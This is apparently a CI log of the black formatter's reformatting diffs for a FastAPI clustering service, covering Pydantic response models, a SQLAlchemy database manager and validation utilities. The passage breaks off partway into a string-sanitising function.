-        description="Human-readable message"
-    )
-    
+
+    success: bool = Field(True, description="Whether the request was successful")
+
+    message: Optional[str] = Field(None, description="Human-readable message")
+
     request_id: Optional[str] = Field(
-        None,
-        description="Unique request identifier for tracking"
-    )
-    
+        None, description="Unique request identifier for tracking"
+    )
+
     timestamp: datetime = Field(
-        default_factory=datetime.utcnow,
-        description="Response timestamp"
-    )
-    
+        default_factory=datetime.utcnow, description="Response timestamp"
+    )
+
     execution_time_ms: Optional[float] = Field(
-        None,
-        description="Request execution time in milliseconds",
-        ge=0.0
+        None, description="Request execution time in milliseconds", ge=0.0
     )
 
 
 class HealthResponse(BaseAPIModel):
     """Health check response."""
-    
+
     status: Literal["healthy", "degraded", "unhealthy"] = Field(
-        ...,
-        description="Overall system health status"
-    )
-    
+        ..., description="Overall system health status"
+    )
+
     timestamp: datetime = Field(
-        default_factory=datetime.utcnow,
-        description="Health check timestamp"
-    )
-    
-    version: str = Field(
-        ...,
-        description="API version"
-    )
-    
+        default_factory=datetime.utcnow, description="Health check timestamp"
+    )
+
+    version: str = Field(..., description="API version")
+
     algorithm_ready: bool = Field(
-        ...,
-        description="Whether the clustering algorithm is ready"
-    )
-    
+        ..., description="Whether the clustering algorithm is ready"
+    )
+
     security_features: List[str] = Field(
-        ...,
-        description="List of enabled security features"
-    )
-    
-    uptime_seconds: float = Field(
-        ...,
-        description="System uptime in seconds",
-        ge=0.0
-    )
-    
+        ..., description="List of enabled security features"
+    )
+
+    uptime_seconds: float = Field(..., description="System uptime in seconds", ge=0.0)
+
     components: Dict[str, str] = Field(
-        default_factory=dict,
-        description="Status of individual system components"
+        default_factory=dict, description="Status of individual system components"
     )
 
 
 class ErrorResponse(BaseAPIModel):
     """Standardized error response."""
-    
-    success: bool = Field(
-        False,
-        description="Always false for error responses"
-    )
-    
-    error_code: ErrorCode = Field(
-        ...,
-        description="Standardized error code"
-    )
-    
-    message: str = Field(
-        ...,
-        description="Human-readable error message"
-    )
-    
-    details: Optional[str] = Field(
-        None,
-        description="Additional error details"
-    )
-    
+
+    success: bool = Field(False, description="Always false for error responses")
+
+    error_code: ErrorCode = Field(..., description="Standardized error code")
+
+    message: str = Field(..., description="Human-readable error message")
+
+    details: Optional[str] = Field(None, description="Additional error details")
+
     request_id: Optional[str] = Field(
-        None,
-        description="Request identifier for debugging"
-    )
-    
+        None, description="Request identifier for debugging"
+    )
+
     timestamp: datetime = Field(
-        default_factory=datetime.utcnow,
-        description="Error timestamp"
-    )
-    
-    path: Optional[str] = Field(
-        None,
-        description="API path where error occurred"
-    )
-    
+        default_factory=datetime.utcnow, description="Error timestamp"
+    )
+
+    path: Optional[str] = Field(None, description="API path where error occurred")
+
     suggestion: Optional[str] = Field(
-        None,
-        description="Suggested action to resolve the error"
+        None, description="Suggested action to resolve the error"
     )
 
 
 class ValidationErrorDetail(BaseAPIModel):
     """Detailed validation error information."""
-    
-    field: str = Field(
-        ...,
-        description="Field name that failed validation"
-    )
-    
-    message: str = Field(
-        ...,
-        description="Validation error message"
-    )
-    
-    invalid_value: Any = Field(
-        None,
-        description="The invalid value that was provided"
-    )
-    
+
+    field: str = Field(..., description="Field name that failed validation")
+
+    message: str = Field(..., description="Validation error message")
+
+    invalid_value: Any = Field(None, description="The invalid value that was provided")
+
     constraint: Optional[str] = Field(
-        None,
-        description="The validation constraint that was violated"
+        None, description="The validation constraint that was violated"
     )
 
 
 # =============================================================================
 # Configuration Models
 # =============================================================================
+
 
 class PaginationParams(BaseAPIModel):
     """Pagination parameters for list endpoints."""
-    
-    page: int = Field(
-        1,
-        description="Page number (1-based)",
-        ge=1
-    )
-    
-    size: int = Field(
-        50,
-        description="Number of items per page",
-        ge=1,
-        le=1000
-    )
-    
+
+    page: int = Field(1, description="Page number (1-based)", ge=1)
+
+    size: int = Field(50, description="Number of items per page", ge=1, le=1000)
+
     @property
     def offset(self) -> int:
         """Calculate offset for database queries."""
         return (self.page - 1) * self.size
 
 
 class BatchProcessingOptions(BaseAPIModel):
     """Options for batch processing operations."""
-    
+
     enable_parallel_processing: bool = Field(
-        True,
-        description="Whether to enable parallel processing for the batch"
-    )
-    
+        True, description="Whether to enable parallel processing for the batch"
+    )
+
     batch_timeout_seconds: int = Field(
-        300,
-        description="Maximum time to wait for batch processing",
-        ge=1,
-        le=3600
-    )
-    
+        300, description="Maximum time to wait for batch processing", ge=1, le=3600
+    )
+
     outlier_detection_enabled: bool = Field(
-        True,
-        description="Whether to enable outlier detection"
-    )
-    
+        True, description="Whether to enable outlier detection"
+    )
+
     adaptive_threshold: bool = Field(
-        True,
-        description="Whether to use adaptive thresholding"
-    )
-    
+        True, description="Whether to use adaptive thresholding"
+    )
+
     return_detailed_metrics: bool = Field(
-        False,
-        description="Whether to include detailed processing metrics"
+        False, description="Whether to include detailed processing metrics"
     )
 
 
 class ClusteringConfiguration(BaseAPIModel):
     """Configuration parameters for the clustering algorithm."""
-    
+
     base_threshold: float = Field(
         0.71,
         description="Base similarity threshold for cluster assignment",
         ge=0.0,
-        le=1.0
-    )
-    
+        le=1.0,
+    )
+
     learning_rate: float = Field(
-        0.06,
-        description="Learning rate for centroid updates",
-        ge=0.001,
-        le=1.0
-    )
-    
+        0.06, description="Learning rate for centroid updates", ge=0.001, le=1.0
+    )
+
     max_clusters: int = Field(
-        30,
-        description="Maximum number of clusters allowed",
-        ge=1,
-        le=1000
-    )
-    
+        30, description="Maximum number of clusters allowed", ge=1, le=1000
+    )
+
     outlier_threshold: float = Field(
-        0.2,
-        description="Threshold for outlier detection",
-        ge=0.0,
-        le=1.0
-    )
-    
+        0.2, description="Threshold for outlier detection", ge=0.0, le=1.0
+    )
+
     performance_mode: bool = Field(
-        True,
-        description="Whether to enable performance optimizations"
-    )
-    
+        True, description="Whether to enable performance optimizations"
+    )
+
     @validator("learning_rate")
     def validate_learning_rate(cls, v):
         """Validate that learning rate is reasonable."""
         if v > 0.5:
             import warnings
+
             warnings.warn("High learning rate may cause instability")
         return v
 
 
 # =============================================================================
 # Batch Operation Models
 # =============================================================================
 
+
 class BatchProcessingResult(BaseAPIModel):
     """Result of batch processing operation."""
-    
+
     total_points: int = Field(
-        ...,
-        description="Total number of points in the batch",
-        ge=0
-    )
-    
+        ..., description="Total number of points in the batch", ge=0
+    )
+
     successful_points: int = Field(
-        ...,
-        description="Number of successfully processed points",
-        ge=0
-    )
-    
+        ..., description="Number of successfully processed points", ge=0
+    )
+
     failed_points: int = Field(
-        ...,
-        description="Number of points that failed processing",
-        ge=0
-    )
-    
+        ..., description="Number of points that failed processing", ge=0
+    )
+
     outliers_detected: int = Field(
-        ...,
-        description="Number of outliers detected in the batch",
-        ge=0
-    )
-    
+        ..., description="Number of outliers detected in the batch", ge=0
+    )
+
     clusters_created: int = Field(
-        ...,
-        description="Number of new clusters created",
-        ge=0
-    )
-    
+        ..., description="Number of new clusters created", ge=0
+    )
+
     processing_time_ms: float = Field(
-        ...,
-        description="Total processing time for the batch",
-        ge=0.0
-    )
-    
+        ..., description="Total processing time for the batch", ge=0.0
+    )
+
     throughput_points_per_second: float = Field(
-        ...,
-        description="Processing throughput for this batch",
-        ge=0.0
-    )
-    
+        ..., description="Processing throughput for this batch", ge=0.0
+    )
+
     results: List[ProcessPointResult] = Field(
-        ...,
-        description="Individual results for each point"
+        ..., description="Individual results for each point"
     )
 
 
 # =============================================================================
 # Monitoring and Metrics Models
 # =============================================================================
+
 
 class PerformanceMetrics(BaseAPIModel):
     """Performance metrics for monitoring."""
-    
+
     requests_per_second: float = Field(
-        ...,
-        description="Current requests per second",
-        ge=0.0
-    )
-    
+        ..., description="Current requests per second", ge=0.0
+    )
+
     average_response_time_ms: float = Field(
-        ...,
-        description="Average response time in milliseconds",
-        ge=0.0
-    )
-    
+        ..., description="Average response time in milliseconds", ge=0.0
+    )
+
     p95_response_time_ms: float = Field(
-        ...,
-        description="95th percentile response time in milliseconds",
-        ge=0.0
-    )
-    
+        ..., description="95th percentile response time in milliseconds", ge=0.0
+    )
+
     error_rate: float = Field(
-        ...,
-        description="Current error rate [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Current error rate [0-1]", ge=0.0, le=1.0
+    )
+
     memory_usage_mb: float = Field(
-        ...,
-        description="Current memory usage in megabytes",
-        ge=0.0
-    )
-    
+        ..., description="Current memory usage in megabytes", ge=0.0
+    )
+
     cpu_usage_percent: float = Field(
-        ...,
-        description="Current CPU usage percentage",
-        ge=0.0,
-        le=100.0
+        ..., description="Current CPU usage percentage", ge=0.0, le=100.0
     )
 
 
 # =============================================================================
 # Model Relationships and Forward References
@@ -798,67 +621,58 @@
 
 
 # =============================================================================
 # Model Validation Utilities
 # =============================================================================
+
 
 def validate_data_point_model(point: List[float]) -> DataPoint:
     """Validate and convert a raw data point to DataPoint model."""
     return DataPoint(coordinates=point)
 
 
 def create_error_response_model(
     error_code: ErrorCode,
     message: str,
     details: Optional[str] = None,
-    suggestion: Optional[str] = None
+    suggestion: Optional[str] = None,
 ) -> ErrorResponse:
     """Create a standardized error response."""
     return ErrorResponse(
-        error_code=error_code,
-        message=message,
-        details=details,
-        suggestion=suggestion
+        error_code=error_code, message=message, details=details, suggestion=suggestion
     )
 
 
 # Export all models for easy importing
 __all__ = [
     # Base models
     "BaseAPIModel",
     "TimestampMixin",
-    
     # Enums
     "ProcessingStatus",
-    "ClusterHealthStatus", 
+    "ClusterHealthStatus",
     "ErrorCode",
     "LogLevel",
-    
     # Core data models
     "DataPoint",
     "ProcessPointsRequest",
     "ProcessPointResult",
     "ClusterInfo",
     "ClustersSummary",
     "AlgorithmStatus",
-    
     # Response models
     "APIResponse",
     "HealthResponse",
     "ErrorResponse",
     "ValidationErrorDetail",
-    
     # Configuration models
     "PaginationParams",
     "BatchProcessingOptions",
     "ClusteringConfiguration",
-    
     # Batch operation models
     "BatchProcessingResult",
-    
     # Monitoring models
     "PerformanceMetrics",
-    
     # Utility functions
     "validate_data_point_model",
     "create_error_response_model",
-]
\ No newline at end of file
+]
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/database/__init__.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/database/__init__.py	2025-06-10 20:31:25.477857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/database/__init__.py	2025-06-10 20:32:32.987218+00:00
@@ -9,62 +9,60 @@
     get_database,
     get_db_session,
     create_tables,
     drop_tables,
     check_db_health,
-    DatabaseManager
+    DatabaseManager,
 )
 
 from .models import (
     Base,
     DataPointRecord,
     ClusterRecord,
     ProcessingSession,
     PerformanceMetric,
     AuditLog,
     UserActivity,
-    SystemConfiguration
+    SystemConfiguration,
 )
 
 from .crud import (
     DataPointCRUD,
     ClusterCRUD,
     SessionCRUD,
     MetricsCRUD,
     AuditCRUD,
     UserCRUD,
-    ConfigCRUD
+    ConfigCRUD,
 )
 
 __all__ = [
     # Connection management
     "get_database",
-    "get_db_session", 
+    "get_db_session",
     "create_tables",
     "drop_tables",
     "check_db_health",
     "DatabaseManager",
-    
     # Models
     "Base",
     "DataPointRecord",
-    "ClusterRecord", 
+    "ClusterRecord",
     "ProcessingSession",
     "PerformanceMetric",
     "AuditLog",
     "UserActivity",
     "SystemConfiguration",
-    
     # CRUD operations
     "DataPointCRUD",
     "ClusterCRUD",
-    "SessionCRUD", 
+    "SessionCRUD",
     "MetricsCRUD",
     "AuditCRUD",
     "UserCRUD",
-    "ConfigCRUD"
+    "ConfigCRUD",
 ]
 
 # Version info
 __version__ = "1.0.0"
 __author__ = "NCS Development Team"
-__description__ = "Database layer for NeuroCluster Streamer API"
\ No newline at end of file
+__description__ = "Database layer for NeuroCluster Streamer API"
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/database/connection.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/database/connection.py	2025-06-10 20:31:25.477857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/database/connection.py	2025-06-10 20:32:33.287764+00:00
@@ -24,354 +24,362 @@
 from .models import Base
 from app.exceptions import DatabaseException, ConnectionException
 
 logger = logging.getLogger(__name__)
 
+
 class DatabaseManager:
     """
     Manages database connections, sessions, and health monitoring.
-    
+
     Provides both sync and async database operations with connection pooling,
     automatic reconnection, and comprehensive health checks.
     """
-    
+
     def __init__(self):
         self.sync_engine: Optional[Engine] = None
         self.async_engine = None
         self.sync_session_factory = None
         self.async_session_factory = None
         self.connection_params = self._get_connection_params()
         self._health_check_cache = {}
         self._last_health_check = 0
         self._health_cache_duration = 30  # seconds
-        
+
     def _get_connection_params(self) -> Dict[str, Any]:
         """Get database connection parameters from environment."""
         return {
-            'host': os.getenv('DB_HOST', 'localhost'),
-            'port': int(os.getenv('DB_PORT', '5432')),
-            'database': os.getenv('DB_NAME', 'ncs_api'),
-            'username': os.getenv('DB_USER', 'postgres'),
-            'password': os.getenv('DB_PASSWORD', 'password'),
-            'pool_size': int(os.getenv('DB_POOL_SIZE', '10')),
-            'max_overflow': int(os.getenv('DB_MAX_OVERFLOW', '20')),
-            'pool_timeout': int(os.getenv('DB_POOL_TIMEOUT', '30')),
-            'pool_recycle': int(os.getenv('DB_POOL_RECYCLE', '3600')),
-            'echo': os.getenv('DB_ECHO', 'false').lower() == 'true'
+            "host": os.getenv("DB_HOST", "localhost"),
+            "port": int(os.getenv("DB_PORT", "5432")),
+            "database": os.getenv("DB_NAME", "ncs_api"),
+            "username": os.getenv("DB_USER", "postgres"),
+            "password": os.getenv("DB_PASSWORD", "password"),
+            "pool_size": int(os.getenv("DB_POOL_SIZE", "10")),
+            "max_overflow": int(os.getenv("DB_MAX_OVERFLOW", "20")),
+            "pool_timeout": int(os.getenv("DB_POOL_TIMEOUT", "30")),
+            "pool_recycle": int(os.getenv("DB_POOL_RECYCLE", "3600")),
+            "echo": os.getenv("DB_ECHO", "false").lower() == "true",
         }
-        
+
     def _build_database_url(self, async_driver: bool = False) -> str:
         """Build database URL with proper encoding."""
         params = self.connection_params
-        password = quote_plus(params['password'])
-        
+        password = quote_plus(params["password"])
+
         if async_driver:
             driver = "postgresql+asyncpg"
         else:
             driver = "postgresql+psycopg2"
-            
+
         return (
             f"{driver}://{params['username']}:{password}@"
             f"{params['host']}:{params['port']}/{params['database']}"
         )
-        
+
     def initialize_sync_engine(self) -> Engine:
         """Initialize synchronous SQLAlchemy engine with connection pooling."""
         if self.sync_engine is not None:
             return self.sync_engine
-            
+
         try:
             params = self.connection_params
             database_url = self._build_database_url(async_driver=False)
-            
+
             self.sync_engine = create_engine(
                 database_url,
                 poolclass=QueuePool,
-                pool_size=params['pool_size'],
-                max_overflow=params['max_overflow'],
-                pool_timeout=params['pool_timeout'],
-                pool_recycle=params['pool_recycle'],
+                pool_size=params["pool_size"],
+                max_overflow=params["max_overflow"],
+                pool_timeout=params["pool_timeout"],
+                pool_recycle=params["pool_recycle"],
                 pool_pre_ping=True,  # Validates connections before use
-                echo=params['echo'],
+                echo=params["echo"],
                 connect_args={
                     "connect_timeout": 10,
                     "command_timeout": 60,
                     "server_settings": {
                         "application_name": "ncs_api",
-                        "jit": "off"  # Disable JIT for consistent performance
-                    }
-                }
+                        "jit": "off",  # Disable JIT for consistent performance
+                    },
+                },
             )
-            
+
             # Add connection event listeners
             self._setup_engine_events(self.sync_engine)
-            
+
             # Create session factory
             self.sync_session_factory = sessionmaker(
                 bind=self.sync_engine,
                 autocommit=False,
                 autoflush=False,
-                expire_on_commit=False
+                expire_on_commit=False,
             )
-            
+
             logger.info("Synchronous database engine initialized successfully")
             return self.sync_engine
-            
+
         except Exception as e:
             logger.error(f"Failed to initialize sync database engine: {e}")
             raise ConnectionException(f"Database connection failed: {e}")
-            
+
     async def initialize_async_engine(self):
         """Initialize asynchronous SQLAlchemy engine."""
         if self.async_engine is not None:
             return self.async_engine
-            
+
         try:
             params = self.connection_params
             database_url = self._build_database_url(async_driver=True)
-            
+
             self.async_engine = create_async_engine(
                 database_url,
-                pool_size=params['pool_size'],
-                max_overflow=params['max_overflow'],
-                pool_timeout=params['pool_timeout'],
-                pool_recycle=params['pool_recycle'],
+                pool_size=params["pool_size"],
+                max_overflow=params["max_overflow"],
+                pool_timeout=params["pool_timeout"],
+                pool_recycle=params["pool_recycle"],
                 pool_pre_ping=True,
-                echo=params['echo'],
+                echo=params["echo"],
                 connect_args={
                     "connect_timeout": 10,
                     "command_timeout": 60,
                     "server_settings": {
                         "application_name": "ncs_api_async",
-                        "jit": "off"
-                    }
-                }
+                        "jit": "off",
+                    },
+                },
             )
-            
+
             # Create async session factory
             self.async_session_factory = async_sessionmaker(
                 bind=self.async_engine,
                 class_=AsyncSession,
                 autocommit=False,
                 autoflush=False,
-                expire_on_commit=False
+                expire_on_commit=False,
             )
-            
+
             logger.info("Asynchronous database engine initialized successfully")
             return self.async_engine
-            
+
         except Exception as e:
             logger.error(f"Failed to initialize async database engine: {e}")
             raise ConnectionException(f"Async database connection failed: {e}")
-            
+
     def _setup_engine_events(self, engine: Engine):
         """Setup SQLAlchemy engine events for monitoring and debugging."""
-        
+
         @event.listens_for(engine, "connect")
         def set_sqlite_pragma(dbapi_connection, connection_record):
             """Configure connection settings."""
-            if engine.dialect.name == 'postgresql':
+            if engine.dialect.name == "postgresql":
                 with dbapi_connection.cursor() as cursor:
                     # Set optimal PostgreSQL settings
                     cursor.execute("SET synchronous_commit = off")
                     cursor.execute("SET wal_buffers = '16MB'")
                     cursor.execute("SET checkpoint_completion_target = 0.9")
-                    
+
         @event.listens_for(engine, "before_cursor_execute")
-        def receive_before_cursor_execute(conn, cursor, statement, parameters, context, executemany):
+        def receive_before_cursor_execute(
+            conn, cursor, statement, parameters, context, executemany
+        ):
             """Log slow queries."""
             context._query_start_time = time.time()
-            
+
         @event.listens_for(engine, "after_cursor_execute")
-        def receive_after_cursor_execute(conn, cursor, statement, parameters, context, executemany):
+        def receive_after_cursor_execute(
+            conn, cursor, statement, parameters, context, executemany
+        ):
             """Log query execution time."""
             total = time.time() - context._query_start_time
             if total > 1.0:  # Log queries taking more than 1 second
                 logger.warning(f"Slow query detected: {total:.2f}s - {statement[:100]}")
-                
+
     @contextmanager
     def get_sync_session(self) -> Generator[Session, None, None]:
         """
         Get synchronous database session with automatic cleanup.
-        
+
         Yields:
             Session: SQLAlchemy session
-            
+
         Raises:
             DatabaseException: If session creation or operations fail
         """
         if self.sync_session_factory is None:
             self.initialize_sync_engine()
-            
+
         session = self.sync_session_factory()
         try:
             yield session
             session.commit()
         except Exception as e:
             session.rollback()
             logger.error(f"Database session error: {e}")
             raise DatabaseException(f"Database operation failed: {e}")
         finally:
             session.close()
-            
+
     @asynccontextmanager
     async def get_async_session(self) -> AsyncSession:
         """
         Get asynchronous database session with automatic cleanup.
-        
+
         Yields:
             AsyncSession: SQLAlchemy async session
-            
+
         Raises:
             DatabaseException: If session creation or operations fail
         """
         if self.async_session_factory is None:
             await self.initialize_async_engine()
-            
+
         session = self.async_session_factory()
         try:
             yield session
             await session.commit()
         except Exception as e:
             await session.rollback()
             logger.error(f"Async database session error: {e}")
             raise DatabaseException(f"Async database operation failed: {e}")
         finally:
             await session.close()
-            
+
     async def check_health(self) -> Dict[str, Any]:
         """
         Comprehensive database health check.
-        
+
         Returns:
             Dict containing health status, connection info, and performance metrics
         """
         current_time = time.time()
-        
+
         # Return cached result if recent
         if (current_time - self._last_health_check) < self._health_cache_duration:
             return self._health_check_cache
-            
-        health_status = {
-            'status': 'healthy',
-            'timestamp': current_time,
-            'checks': {}
-        }
-        
+
+        health_status = {"status": "healthy", "timestamp": current_time, "checks": {}}
+
         try:
             # Test synchronous connection
             sync_start = time.time()
             with self.get_sync_session() as session:
                 result = session.execute(text("SELECT 1")).scalar()
                 assert result == 1
             sync_duration = time.time() - sync_start
-            
-            health_status['checks']['sync_connection'] = {
-                'status': 'ok',
-                'response_time_ms': round(sync_duration * 1000, 2)
+
+            health_status["checks"]["sync_connection"] = {
+                "status": "ok",
+                "response_time_ms": round(sync_duration * 1000, 2),
             }
-            
+
             # Test asynchronous connection
             async_start = time.time()
             async with self.get_async_session() as session:
                 result = await session.execute(text("SELECT 1"))
                 assert result.scalar() == 1
             async_duration = time.time() - async_start
-            
-            health_status['checks']['async_connection'] = {
-                'status': 'ok', 
-                'response_time_ms': round(async_duration * 1000, 2)
+
+            health_status["checks"]["async_connection"] = {
+                "status": "ok",
+                "response_time_ms": round(async_duration * 1000, 2),
             }
-            
+
             # Get connection pool status
             if self.sync_engine:
                 pool = self.sync_engine.pool
-                health_status['checks']['connection_pool'] = {
-                    'status': 'ok',
-                    'size': pool.size(),
-                    'checked_in': pool.checkedin(),
-                    'checked_out': pool.checkedout(),
-                    'overflow': pool.overflow(),
-                    'total_connections': pool.checkedin() + pool.checkedout()
+                health_status["checks"]["connection_pool"] = {
+                    "status": "ok",
+                    "size": pool.size(),
+                    "checked_in": pool.checkedin(),
+                    "checked_out": pool.checkedout(),
+                    "overflow": pool.overflow(),
+                    "total_connections": pool.checkedin() + pool.checkedout(),
                 }
-                
+
             # Database-specific metrics
             with self.get_sync_session() as session:
                 # Get database size
-                db_size_result = session.execute(text(
-                    "SELECT pg_size_pretty(pg_database_size(current_database()))"
-                )).scalar()
-                
+                db_size_result = session.execute(
+                    text("SELECT pg_size_pretty(pg_database_size(current_database()))")
+                ).scalar()
+
                 # Get active connections
-                active_connections = session.execute(text(
-                    "SELECT count(*) FROM pg_stat_activity WHERE state = 'active'"
-                )).scalar()
-                
+                active_connections = session.execute(
+                    text("SELECT count(*) FROM pg_stat_activity WHERE state = 'active'")
+                ).scalar()
+
                 # Get database version
                 db_version = session.execute(text("SELECT version()")).scalar()
-                
-                health_status['checks']['database_metrics'] = {
-                    'status': 'ok',
-                    'database_size': db_size_result,
-                    'active_connections': active_connections,
-                    'version': db_version.split()[0:2] if db_version else 'Unknown'
+
+                health_status["checks"]["database_metrics"] = {
+                    "status": "ok",
+                    "database_size": db_size_result,
+                    "active_connections": active_connections,
+                    "version": db_version.split()[0:2] if db_version else "Unknown",
                 }
-                
+
         except Exception as e:
             logger.error(f"Database health check failed: {e}")
-            health_status['status'] = 'unhealthy'
-            health_status['error'] = str(e)
-            
+            health_status["status"] = "unhealthy"
+            health_status["error"] = str(e)
+
         # Cache the result
         self._health_check_cache = health_status
         self._last_health_check = current_time
-        
+
         return health_status
-        
+
     async def close_connections(self):
         """Close all database connections and clean up resources."""
         try:
             if self.async_engine:
                 await self.async_engine.dispose()
                 logger.info("Async database engine disposed")
-                
+
             if self.sync_engine:
                 self.sync_engine.dispose()
                 logger.info("Sync database engine disposed")
-                
+
         except Exception as e:
             logger.error(f"Error closing database connections: {e}")
+
 
 # Global database manager instance
 db_manager = DatabaseManager()
+
 
 # FastAPI dependency functions
 def get_database() -> DatabaseManager:
     """FastAPI dependency to get database manager."""
     return db_manager
 
+
 def get_db_session() -> Generator[Session, None, None]:
     """FastAPI dependency to get database session."""
     with db_manager.get_sync_session() as session:
         yield session
 
+
 async def get_async_db_session() -> AsyncSession:
     """FastAPI dependency to get async database session."""
     async with db_manager.get_async_session() as session:
         yield session
+
 
 # Convenience functions
 def create_tables():
     """Create all database tables."""
     engine = db_manager.initialize_sync_engine()
     Base.metadata.create_all(bind=engine)
     logger.info("Database tables created successfully")
 
+
 def drop_tables():
     """Drop all database tables."""
-    engine = db_manager.initialize_sync_engine() 
+    engine = db_manager.initialize_sync_engine()
     Base.metadata.drop_all(bind=engine)
     logger.info("Database tables dropped successfully")
 
+
 async def check_db_health() -> Dict[str, Any]:
     """Check database health status."""
-    return await db_manager.check_health()
\ No newline at end of file
+    return await db_manager.check_health()
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/app/utils.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/app/utils.py	2025-06-10 20:31:25.476857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/app/utils.py	2025-06-10 20:32:33.290363+00:00
@@ -22,12 +22,21 @@
 import functools
 import asyncio
 import threading
 from datetime import datetime, timedelta
 from typing import (
-    Any, Dict, List, Optional, Union, Callable, TypeVar, Generic,
-    Tuple, Iterator, AsyncIterator
+    Any,
+    Dict,
+    List,
+    Optional,
+    Union,
+    Callable,
+    TypeVar,
+    Generic,
+    Tuple,
+    Iterator,
+    AsyncIterator,
 )
 from contextlib import contextmanager, asynccontextmanager
 from dataclasses import dataclass
 import logging
 
@@ -36,93 +45,97 @@
 
 from .models import ErrorCode, DataPoint
 from .exceptions import ValidationException, ProcessingException
 
 # Type variables for generic functions
-T = TypeVar('T')
-F = TypeVar('F', bound=Callable[..., Any])
+T = TypeVar("T")
+F = TypeVar("F", bound=Callable[..., Any])
 
 # Configure logger
 logger = logging.getLogger(__name__)
 
 
 # =============================================================================
 # ID and Token Generation
 # =============================================================================
 
+
 def generate_request_id() -> str:
     """
     Generate a unique request ID for tracking.
-    
+
     Returns:
         Unique request identifier
     """
     return f"req_{uuid.uuid4().hex[:16]}"
 
 
 def generate_session_id() -> str:
     """
     Generate a unique session ID.
-    
+
     Returns:
         Unique session identifier
     """
     return f"sess_{uuid.uuid4().hex[:24]}"
 
 
 def generate_api_key_id() -> str:
     """
     Generate a unique API key identifier.
-    
+
     Returns:
         Unique API key identifier
     """
     return f"key_{uuid.uuid4().hex[:12]}"
 
 
 def generate_cluster_id() -> str:
     """
     Generate a unique cluster identifier.
-    
+
     Returns:
         Unique cluster identifier
     """
     return f"cluster_{int(time.time() * 1000)}_{uuid.uuid4().hex[:8]}"
 
 
 def create_hash(data: Union[str, bytes, Dict[str, Any]]) -> str:
     """
     Create SHA-256 hash of data.
-    
+
     Args:
         data: Data to hash
-        
+
     Returns:
         Hexadecimal hash string
     """
     if isinstance(data, dict):
         data = json.dumps(data, sort_keys=True)
     elif isinstance(data, str):
-        data = data.encode('utf-8')
-    
+        data = data.encode("utf-8")
+
     return hashlib.sha256(data).hexdigest()
 
 
 # =============================================================================
 # Data Validation Utilities
 # =============================================================================
 
-def validate_data_point(point: Union[List[float], np.ndarray, Dict[str, Any]]) -> DataPoint:
+
+def validate_data_point(
+    point: Union[List[float], np.ndarray, Dict[str, Any]]
+) -> DataPoint:
     """
     Validate and convert a data point to DataPoint model.
-    
+
     Args:
         point: Input data point in various formats
-        
+
     Returns:
         Validated DataPoint instance
-        
+
     Raises:
         ValidationException: If validation fails
     """
     try:
         if isinstance(point, dict):
@@ -130,162 +143,165 @@
         elif isinstance(point, (list, np.ndarray)):
             coordinates = point.tolist() if isinstance(point, np.ndarray) else point
             return DataPoint(coordinates=coordinates)
         else:
             raise ValueError(f"Unsupported point type: {type(point)}")
-    
+
     except (ValidationError, ValueError) as e:
         raise ValidationException(f"Invalid data point: {str(e)}")
 
 
 def validate_batch_size(batch_size: int, max_size: int = 10000) -> bool:
     """
     Validate batch size against limits.
-    
+
     Args:
         batch_size: Size of the batch
         max_size: Maximum allowed batch size
-        
+
     Returns:
         True if valid
-        
+
     Raises:
         ValidationException: If batch size is invalid
     """
     if batch_size <= 0:
         raise ValidationException("Batch size must be positive")
-    
+
     if batch_size > max_size:
         raise ValidationException(
             f"Batch size {batch_size} exceeds maximum {max_size}",
-            details={"provided_size": batch_size, "max_size": max_size}
+            details={"provided_size": batch_size, "max_size": max_size},
         )
-    
+
     return True
 
 
 def validate_coordinates(coordinates: List[float], max_dimensions: int = 1000) -> bool:
     """
     Validate coordinate list.
-    
+
     Args:
         coordinates: List of coordinate values
         max_dimensions: Maximum allowed dimensions
-        
+
     Returns:
         True if valid
-        
+
     Raises:
         ValidationException: If coordinates are invalid
     """
     if not coordinates:
         raise ValidationException("Coordinates cannot be empty")
-    
+
     if len(coordinates) > max_dimensions:
         raise ValidationException(
             f"Too many dimensions: {len(coordinates)} > {max_dimensions}"
         )
-    
+
     for i, coord in enumerate(coordinates):
         if not isinstance(coord, (int, float)):
             raise ValidationException(f"Coordinate {i} must be numeric")
-        
+
         if not np.isfinite(coord):
             raise ValidationException(f"Coordinate {i} must be finite")
-    
+
     return True
 
 
 def validate_clustering_params(params: Dict[str, Any]) -> Dict[str, Any]:
     """
     Validate clustering algorithm parameters.
-    
+
     Args:
         params: Parameter dictionary
-        
+
     Returns:
         Validated parameters
-        
+
     Raises:
         ValidationException: If parameters are invalid
     """
     validated = {}
-    
+
     # Validate threshold parameters
-    threshold_params = ['base_threshold', 'merge_threshold', 'outlier_threshold']
+    threshold_params = ["base_threshold", "merge_threshold", "outlier_threshold"]
     for param in threshold_params:
         if param in params:
             value = params[param]
             if not isinstance(value, (int, float)) or not (0.0 <= value <= 1.0):
                 raise ValidationException(f"{param} must be between 0.0 and 1.0")
             validated[param] = float(value)
-    
+
     # Validate rate parameters
-    rate_params = ['learning_rate', 'decay_rate']
+    rate_params = ["learning_rate", "decay_rate"]
     for param in rate_params:
         if param in params:
             value = params[param]
             if not isinstance(value, (int, float)) or not (0.0 < value <= 1.0):
                 raise ValidationException(f"{param} must be between 0.0 and 1.0")
             validated[param] = float(value)
-    
+
     # Validate integer parameters
-    int_params = ['max_clusters', 'stability_window', 'validation_window']
+    int_params = ["max_clusters", "stability_window", "validation_window"]
     for param in int_params:
         if param in params:
             value = params[param]
             if not isinstance(value, int) or value <= 0:
                 raise ValidationException(f"{param} must be a positive integer")
             validated[param] = int(value)
-    
+
     # Validate boolean parameters
-    bool_params = ['performance_mode']
+    bool_params = ["performance_mode"]
     for param in bool_params:
         if param in params:
             validated[param] = bool(params[param])
-    
+
     return validated
 
 
 # =============================================================================
 # Input Sanitization
 # =============================================================================
 
+
 def sanitize_string(text: str, max_length: int = 1000) -> str:
     """
     Sanitize string input for security.
-    
+
     Args:
         text: Input text
         max_length: Maximum allowed length
-        
+
     Returns:
         Sanitized string
     """
     if not isinstance(text, str):
